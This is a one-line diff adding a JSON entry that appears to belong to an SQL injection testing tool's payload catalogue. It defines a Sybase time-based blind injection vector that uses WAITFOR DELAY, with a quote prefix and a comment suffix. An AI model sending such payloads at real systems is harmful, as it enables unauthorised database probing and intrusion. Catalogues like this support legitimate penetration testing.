@@ -1,0 +1,1 @@
+{"dbms": "sybase", "technique": "time", "boundary": {"prefix": "'", "suffix": "/*", "type": "single"}, "vector": "{B} AND (SELECT WAITFOR DELAY '0:0:5')", "comment": "sybase time: single, block"}
